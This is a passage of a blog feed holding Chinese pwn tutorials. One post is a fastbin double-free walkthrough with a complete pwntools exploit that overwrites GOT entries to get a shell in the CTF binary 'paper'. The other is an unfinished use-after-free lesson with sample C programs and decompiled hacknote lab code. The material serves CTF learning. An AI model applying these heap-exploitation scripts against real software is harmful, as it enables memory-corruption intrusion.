            "content_html": "<p>xuanxuan : <a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a></p>\n<h1 id=\"Write-Some-Paper\"><a href=\"#Write-Some-Paper\" class=\"headerlink\" title=\"Write_Some_Paper\"></a>Write_Some_Paper</h1><p>申请不同的编号有影响吗????</p>\n<h2 id=\"怎么getshell呢\"><a href=\"#怎么getshell呢\" class=\"headerlink\" title=\"怎么getshell呢?\"></a>怎么getshell呢?</h2><p>​\t\t首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了</p>\n<h2 id=\"怎么实现地址写\"><a href=\"#怎么实现地址写\" class=\"headerlink\" title=\"怎么实现地址写?\"></a>怎么实现地址写?</h2><p>​\t\t利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力</p>\n<h2 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)  <span class=\"comment\">//double free了</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))<span class=\"comment\">//这个需要填入覆盖地址了</span></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)  <span class=\"comment\">// 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>])) <span class=\"comment\">//此时申请的就是第一次add时填入的fd地址\t\t</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"申请堆块时的地址约束\"><a href=\"#申请堆块时的地址约束\" class=\"headerlink\" title=\"申请堆块时的地址约束\"></a>申请堆块时的地址约束</h2><p>​\t\t即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：</p>\n<ol>\n<li>寻找是否有天然满足伪堆块的约束的内存</li>\n<li>想办法构造伪堆块</li>\n</ol>\n<p>8字节prev_size 随意 , <font color=\"red\">8字节size(64位下前4字节满足大小,如0x40大小)</font>,要覆盖的fd(要修改的内存地址)</p>\n<p>要找到覆盖的函数,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">16</span>gx <span class=\"number\">0x602000</span></span><br><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x0000000000601e28</span>\t<span class=\"number\">0x00007ffff7ffe168</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0x00007ffff7dee0b0</span>\t<span class=\"number\">0x00007ffff7a91a70</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span>:\t<span class=\"number\">0x00007ffff7a7d5d0</span>\t<span class=\"number\">0x00007ffff7a7c0e0</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span>:\t<span class=\"number\">0x0000000000400746</span>\t<span class=\"number\">0x0000000000400756</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span>:\t<span class=\"number\">0x00007ffff7a637b0</span>\t<span class=\"number\">0x00007ffff7a2e740</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span>:\t<span class=\"number\">0x0000000000400786</span>\t<span class=\"number\">0x00007ffff7a493b0</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span>:\t<span class=\"number\">0x00007ffff7a91550</span>\t<span class=\"number\">0x00007ffff7a7ddb0</span></span><br><span class=\"line\"><span class=\"number\">0x602070</span>:\t<span class=\"number\">0x00007ffff7a79480</span>\t<span class=\"number\">0x00000000004007d6</span></span><br></pre></td></tr></table></figure>\n\n<p>这几个地方都可以作为size</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230307155602238.png\" alt=\"image-20230307155602238\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x28</span>\t<span class=\"number\">0x1e</span>\t<span class=\"number\">0x60</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602008</span>:\t<span class=\"number\">0x68</span>\t<span class=\"number\">0xe1</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xde</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602018</span> &lt;<span class=\"built_in\">free</span>@got.plt&gt;:\t<span class=\"number\">0x70</span>\t<span class=\"number\">0x1a</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span> &lt;<span class=\"built_in\">puts</span>@got.plt&gt;:\t<span class=\"number\">0xd0</span>\t<span class=\"number\">0xd5</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602028</span> &lt;fread@got.plt&gt;:\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xc0</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span> &lt;__stack_chk_fail@got.plt&gt;:\t<span class=\"number\">0x46</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602038</span> &lt;system@got.plt&gt;:\t<span class=\"number\">0x56</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span> &lt;<span class=\"built_in\">printf</span>@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x37</span>\t<span class=\"number\">0xa6</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602048</span> &lt;__libc_start_main@got.plt&gt;:\t<span class=\"number\">0x40</span>\t<span class=\"number\">0xe7</span>\t<span class=\"number\">0xa2</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span> &lt;__gmon_start__@got.plt&gt;:\t<span class=\"number\">0x86</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602058</span> &lt;strtol@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x93</span>\t<span class=\"number\">0xa4</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span> &lt;<span class=\"built_in\">malloc</span>@got.plt&gt;:\t<span class=\"number\">0x50</span>\t<span class=\"number\">0x15</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t<font color=\"red\">根据这个来选择申请的堆块的大小</font></p>\n<p>​\t\t注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230411214141077.png\" alt=\"image-20230411214141077\">\t</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">num,length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;enter&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))//这个需要填入覆盖地址了</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "PWN入门",
                "堆"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/",
            "title": "pwn入门-15-堆利用之Use-After-Free",
            "date_published": "2023-03-06T05:21:37.000Z",
            "content_html": "<h1 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h1><p>复制的wiki的:</p>\n<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>\n<ul>\n<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>\n</ul>\n<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>\n<h2 id=\"自己的理解\"><a href=\"#自己的理解\" class=\"headerlink\" title=\"自己的理解\"></a>自己的理解</h2><p>​\t\t<font color=\"red\">我理解的就是free后没有清空指针,导致还可以继续利用,利用的方式就是申请到free的bins然后覆盖上数据,借此修改一些函数指向等</font></p>\n<p>​\t\t4.16补充: 其实利用方式很多,总的来说是free后要对它能进行一定的操作,然后free前的功能还能用,比如puts等,就会导致问题.</p>\n<h1 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h1><p>​\t\t这是wiki上的例子,可以编译一下然后看看效果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">name</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *myname;</span><br><span class=\"line\">  <span class=\"type\">void</span> (*func)(<span class=\"type\">char</span> *str);</span><br><span class=\"line\">&#125; NAME;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">myprint</span><span class=\"params\">(<span class=\"type\">char</span> *str)</span> &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, str); &#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">printmyname</span><span class=\"params\">()</span> &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call print my name\\n&quot;</span>); &#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  NAME *a;</span><br><span class=\"line\">  a = (NAME *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> name));</span><br><span class=\"line\">  a-&gt;func = myprint;</span><br><span class=\"line\">  a-&gt;myname = <span class=\"string\">&quot;I can also use it&quot;</span>;</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;this is my function&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// free without modify</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;I can also use it&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// free with modify</span></span><br><span class=\"line\">  a-&gt;func = printmyname;</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;this is my function&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// set NULL</span></span><br><span class=\"line\">  a = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this pogram will crash...\\n&quot;</span>);</span><br><span class=\"line\">  a-&gt;func(<span class=\"string\">&quot;can not be printed...&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t细节注意:编译的时候要指定好libc,不然如果使用的libc版本过高就会有问题,之前一直在踩这个坑…而且如果事先不指定,编译完再patchelf的话也会有问题,(目前还不懂)</p>\n<p>​\tgcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<p>​\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/heap/useafter# ./a.out</span><br><span class=\"line\">this is my function</span><br><span class=\"line\">I can also use it</span><br><span class=\"line\">call print my name</span><br><span class=\"line\">this pogram will crash...</span><br><span class=\"line\">Segmentation <span class=\"title function_\">fault</span> <span class=\"params\">(core dumped)</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t\ta &#x3D; NULL的话 , free的过程是怎样的? NULL修改了什么呢?</p>\n<h2 id=\"看雪的一个例子\"><a href=\"#看雪的一个例子\" class=\"headerlink\" title=\"看雪的一个例子\"></a>看雪的一个例子</h2><p>具体看雪的链接找不到了..</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func1</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;func1\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">hack</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hack\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Pfunc</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">void</span> (*p)();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Pfunc</span>* <span class=\"title\">lpfunc</span> =</span> <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">    lpfunc-&gt;p = func1;</span><br><span class=\"line\">    lpfunc-&gt;p();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"built_in\">free</span>(lpfunc);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"type\">long</span>* hack_point = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">    *hack_point = hack;</span><br><span class=\"line\"> </span><br><span class=\"line\">    lpfunc-&gt;p();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个函数就是先申请一个Pfunc结构体指针,分配了一块堆空间,然后把它结构体成员p赋值为一个函数地址,就可以调用了. 然后将这个结构体释放,又申请了一个新的堆空间,赋值为另外一个函数,<font color=\"red\">原先的结构体指针仍然可以利用</font> ,</p>\n<p>​\t\t那free和没free有什么差别呢????????? free的话,是把这块空间标记为空闲可用,所以说应该还有一个地方,存储着这块空间的管理结构,但是这块空间本身是没有改变的.</p>\n<h2 id=\"HITCON-training-中的-lab-10-hacknote\"><a href=\"#HITCON-training-中的-lab-10-hacknote\" class=\"headerlink\" title=\"HITCON-training 中的 lab 10 hacknote\"></a>HITCON-training 中的 <a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote\">lab 10 hacknote</a></h2><p>main</p>\n<p>​\t\t获取用户的输入,然后根据输入进行不同的选择</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      menu();</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">      v3 = atoi(&amp;buf);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      del_note();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        print_note();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span 